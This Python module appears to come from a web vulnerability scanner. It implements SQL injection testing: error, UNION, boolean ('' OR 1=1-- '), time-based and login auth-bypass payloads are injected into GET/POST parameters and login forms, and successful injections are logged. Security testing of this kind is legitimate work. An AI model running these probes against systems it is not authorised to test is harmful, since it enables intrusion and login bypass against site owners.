# components/attack/sqli.py

import os
import copy
import time
import re
import xml.etree.ElementTree as ET
from pathlib import Path
from urllib.parse import urlencode

from components.attack.base_attack import BaseAttack
from components.main.logger import logger
from components.parsers.html import HTML

class SQLInjection(BaseAttack):
    name = 'sqli'

    # Inline boolean‐based payloads
    BOOLEAN_PAYLOADS = {
        'true':  "' OR 1=1-- ",
        'false': "' OR 1=2-- ",
    }

    # Regex for detecting UNION…SELECT
    UNION_REGEX = re.compile(r"union(?:.|\s)*select", re.IGNORECASE)

    def __init__(self, crawler, crawler_config):
        super().__init__(crawler, crawler_config)
        self.payloads      = self._load_payload_files()
        self.error_regexes = self._load_error_regexes()

    def _load_payload_files(self):
        """
        Load payload lists from components/payloads/sqli/*.txt
        """
        base = Path(__file__).parent.parent / 'payloads' / 'sqli'
        mapping = {
            'error':       'sqli_error.txt',
            'time':        'sqli_time.txt',
            'union':       'sqli_union.txt',
            'auth_bypass': 'sqli_auth_bypass.txt',
        }
        out = {}
        for key, fname in mapping.items():
            path = base / fname
            try:
                with open(path, encoding='utf-8') as f:
                    lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                out[key] = lines
            except Exception as e:
                logger.error(f"[sqli] cannot load payload file {path}: {e}")
                out[key] = []
        return out

    def _load_error_regexes(self):
        """
        Parse database_errors.xml and compile all <error regexp="…"/> patterns
        """
        xml_path = Path(__file__).parent.parent / 'payloads' / 'sqli' / 'database_errors.xml'
        regexes = []
        if not xml_path.exists():
            logger.error(f"[sqli] error‐regex file not found: {xml_path}")
            return regexes

        try:
            tree = ET.parse(xml_path)
            root = tree.getroot()
            for err in root.findall('.//error'):
                pat = err.get('regexp')
                if not pat:
                    continue
                try:
                    regexes.append(re.compile(pat, re.IGNORECASE))
                except re.error as re_err:
                    logger.error(f"[sqli] invalid regex in {xml_path}: {pat} ({re_err})")
        except Exception as e:
            logger.error(f"[sqli] failed to parse {xml_path}: {e}")

        return regexes

    async def run(self, request, response):
        if request.get_params or request.post_params:
            base_text   = response.text
            base_status = response.status_code

            # 1) ERROR-based
            for p in self.payloads.get('error', []):
                if await self._test_error_union(request, p, base_text, base_status, kind='ERROR'):
                    break

            # 2) UNION-based
            for p in self.payloads.get('union', []):
                if await self._test_error_union(request, p, base_text, base_status, kind='UNION'):
                    break

            # 3) BOOLEAN-based
            await self._test_boolean(request)

            # 4) TIME-based
            for p in self.payloads.get('time', []):
                if await self._test_time(request, p):
                    break

        # 5) AUTH-BYPASS on login forms
        html = HTML(response.text, request.url)
        form_req, user_idx, pass_idx = html.find_login_form()
        #print(form_req, user_idx, pass_idx)
        if form_req:
            await self._test_auth_bypass(form_req, user_idx, pass_idx)

    async def _test_error_union(self, request, payload, base_text, base_status, kind):
        """
        Inject payload into each param and look for:
          - SQL errors (using loaded regexes)
          - UNION…SELECT
          - HTTP 5xx code changes
          - large content-length diffs
        """
        async def check(resp):
            try:
                txt = (await resp.aread()).decode(request.encoding, 'ignore')
                st  = resp.status_code
            finally:
                await resp.aclose()

            # SQL-error detection
            if kind == 'ERROR' and any(rx.search(txt) for rx in self.error_regexes):
                return True

            # UNION detection
            if kind == 'UNION' and self.UNION_REGEX.search(txt):
                return True

            # server-error status code
            if st >= 500 and st != base_status:
                return True

            # page-size anomaly
            if abs(len(txt) - len(base_text)) > 200:
                return True

            return False

        # GET params
        for key, vals in request.get_params.items():
            orig = vals[0]
            mod  = copy.deepcopy(request)

            new_q = {**mod.get_params, key: [orig + payload]}
            mod.get_params = new_q
            qs = urlencode(mod.get_params, doseq=True)
            mod._url = f"{mod._resource_path}?{qs}"

            resp = await self.crawler.send(mod)
            if await check(resp):
                logger.info(f"[sqli][{kind}] {mod.url} param `{key}` ← `{payload}`")
                return True

        # POST params
        for idx, (key, orig) in enumerate(request.post_params):
            mod = copy.deepcopy(request)
            pp  = list(mod.post_params)
            pp[idx][1] = orig + payload
            mod.post_params = pp

            resp = await self.crawler.send(mod)
            if await check(resp):
                logger.info(f"[sqli][{kind}] {mod.url} param `{key}` ← `{payload}`")
                return True

        return False

    async def _test_boolean(self, request):
        """
        Send “true” vs. “false” payloads and flag any content differences.
        """
        async def fetch(mod):
            r = await self.crawler.send(mod)
            t = (await r.aread()).decode(request.encoding, 'ignore')
            await r.aclose()
            return t

        # GET
        for key, vals in request.get_params.items():
            orig = vals[0]

            # true case
            mod_t = copy.deepcopy(request)
            q_t = {**mod_t.get_params, key: [orig + self.BOOLEAN_PAYLOADS['true']]}
            mod_t.get_params = q_t
            mod_t._url = f"{mod_t._resource_path}?{urlencode(q_t, doseq=True)}"
            txt_t = await fetch(mod_t)

            # false case
            mod_f = copy.deepcopy(request)
            q_f = {**mod_f.get_params, key: [orig + self.BOOLEAN_PAYLOADS['false']]}
            mod_f.get_params = q_f
            mod_f._url = f"{mod_f._resource_path}?{urlencode(q_f, doseq=True)}"
            txt_f = await fetch(mod_f)

            if txt_t != txt_f:
                logger.info(f"[sqli][BOOLEAN] {mod_t.url} param `{key}` TRUE vs FALSE differ")
                return

        # POST
        for idx, (key, orig) in enumerate(request.post_params):
            # true
            mod_t = copy.deepcopy(request)
            pp  = list(mod_t.post_params)
            pp[idx][1] = orig + self.BOOLEAN_PAYLOADS['true']
            mod_t.post_params = pp
            txt_t = await fetch(mod_t)
            # false
            mod_f = copy.deepcopy(request)
            pp  = list(mod_f.post_params)
            pp[idx][1] = orig + self.BOOLEAN_PAYLOADS['false']
            mod_f.post_params = pp
            txt_f = await fetch(mod_f)

            if txt_t != txt_f:
                logger.info(f"[sqli][BOOLEAN] {mod_t.url} param `{key}` TRUE vs FALSE differ")
                return

    async def _test_time(self, request, payload, threshold=3.0):
        """
        Inject time-based payloads and flag if elapsed > threshold.
        """
        def timer_send(mod):
            start = time.time()
            coro  = self.crawler.send(mod)
            return start, coro

        # GET
        for key, vals in request.get_params.items():
            orig = vals[0]
            mod  = copy.deepcopy(request)
            q    = {**mod.get_params, key: [orig + payload]}
            mod.get_params = q
            mod._url = f"{mod._resource_path}?{urlencode(q, doseq=True)}"

            start, coro = timer_send(mod)
            resp = await coro
            elapsed = time.time() - start
            await resp.aclose()

            if elapsed > threshold:
                logger.info(f"[sqli][TIME] {mod.url} param `{key}` took {elapsed:.1f}s ← `{payload}`")
                return True

        # POST
        for idx, (key, orig) in enumerate(request.post_params):
            mod = copy.deepcopy(request)
            pp  = list(mod.post_params)
            pp[idx][1] = orig + payload
            mod.post_params = pp

            start, coro = timer_send(mod)
            resp = await coro
            elapsed = time.time() - start
            await resp.aclose()

            if elapsed > threshold:
                logger.info(f"[sqli][TIME] {mod.url} param `{key}` took {elapsed:.1f}s ← `{payload}`")
                return True

        return False

    async def _test_auth_bypass(self, form_req, user_idx, pass_idx):
        """
        Inject each auth-bypass payload into the username field
        and look for a logout link via HTML.is_logged_in().
        """
        # baseline
        base = copy.deepcopy(form_req)
        r0   = await self.crawler.send(base)
        t0   = await r0.aread()
        await r0.aclose()
        h0   = HTML(t0.decode(base.encoding, 'ignore'), base.url).is_logged_in()

        for p in self.payloads.get('auth_bypass', []):
            mod = copy.deepcopy(form_req)
            pp  = list(mod.post_params)
            pp[user_idx][1] = p
            mod.post_params  = pp

            r1 = await self.crawler.send(mod)
            t1 = await r1.aread()
            await r1.aclose()
            if HTML(t1.decode(mod.encoding, 'ignore'), mod.url).is_logged_in() and not h0:
                logger.info(f"[sqli][AUTH] {mod.url} user‐field ← `{p}` bypassed login")
                return True
            
        for p in self.payloads.get('auth_bypass', []):
            mod = copy.deepcopy(form_req)
            pp = list(mod.post_params)

            pp[pass_idx][1] = p
            mod.post_params = pp

            resp = await self.crawler.send(mod)
            body = await resp.aread()
            await resp.aclose()

            if HTML(body.decode(mod.encoding, 'ignore'), mod.url).is_logged_in() and not h0:
                logger.info(f"[sqli][AUTH] {mod.url} password-field ← `{p}` bypassed login")
                return True

        return False
